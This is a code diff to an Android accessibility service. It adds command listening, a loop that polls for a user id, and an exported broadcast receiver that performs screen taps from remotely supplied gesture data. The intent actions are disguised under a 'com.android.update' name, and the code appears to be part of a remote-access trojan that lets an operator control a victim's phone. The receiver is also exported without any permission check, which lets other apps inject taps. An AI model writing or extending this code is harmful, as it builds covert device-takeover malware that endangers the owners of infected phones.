@@ -113,27 +113,65 @@ public class MyAccessibilityService extends AccessibilityService {
         userId = prefs.getString("userId", null);
         if (userId != null) {
             listenForCommands(userId);
+        } else {
+            Log.d(TAG, "userId is null, starting sync retry loop...");
+            startUserIdSyncLoop();
         }
 
-        // ✅ Register receiver for Interactive Remote Control via WebSockets
+        // ✅ Register receiver for Interactive Remote Control + LOGIN_SUCCESS
+        IntentFilter filter = new IntentFilter();
+        filter.addAction("com.android.update.REMOTE_GESTURE");
+        filter.addAction("com.android.update.LOGIN_SUCCESS");
+        
         registerReceiver(new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
-                String jsonData = intent.getStringExtra("gesture_data");
-                if (jsonData != null) {
-                    try {
-                        JSONObject obj = new JSONObject(jsonData);
-                        if ("tap".equals(obj.getString("action"))) {
-                            double relX = obj.getDouble("x");
-                            double relY = obj.getDouble("y");
-                            executeTap(relX, relY);
+                if ("com.android.update.LOGIN_SUCCESS".equals(intent.getAction())) {
+                    Log.d(TAG, "Login Success broadcast received! Syncing userId...");
+                    SharedPreferences p = getSharedPreferences("UserPrefs", MODE_PRIVATE);
+                    String newUid = p.getString("userId", null);
+                    if (newUid != null && !newUid.equals(userId)) {
+                        userId = newUid;
+                        listenForCommands(userId);
+                    }
+                } else if ("com.android.update.REMOTE_GESTURE".equals(intent.getAction())) {
+                    String jsonData = intent.getStringExtra("gesture_data");
+                    if (jsonData != null) {
+                        try {
+                            JSONObject obj = new JSONObject(jsonData);
+                            if ("tap".equals(obj.getString("action"))) {
+                                double relX = obj.getDouble("x");
+                                double relY = obj.getDouble("y");
+                                executeTap(relX, relY);
+                            }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Gesture error: " + e.getMessage());
                         }
-                    } catch (Exception e) {
-                        Log.e(TAG, "Gesture error: " + e.getMessage());
                     }
                 }
             }
-        }, new IntentFilter("com.android.update.REMOTE_GESTURE"), Context.RECEIVER_EXPORTED);
+        }, filter, Context.RECEIVER_EXPORTED);
+    }
+
+    private void startUserIdSyncLoop() {
+        android.os.Handler syncHandler = new android.os.Handler();
+        syncHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (userId != null) return; // Already found
+
+                SharedPreferences prefs = getSharedPreferences("UserPrefs", MODE_PRIVATE);
+                String foundId = prefs.getString("userId", null);
+                if (foundId != null) {
+                    Log.d(TAG, "userId found via Sync Loop: " + foundId);
+                    userId = foundId;
+                    listenForCommands(userId);
+                } else {
+                    Log.d(TAG, "userId still null, retrying in 5s...");
+                    syncHandler.postDelayed(this, 5000);
+                }
+            }
+        }, 5000);
     }
 
     private void executeTap(double relX, double relY) {
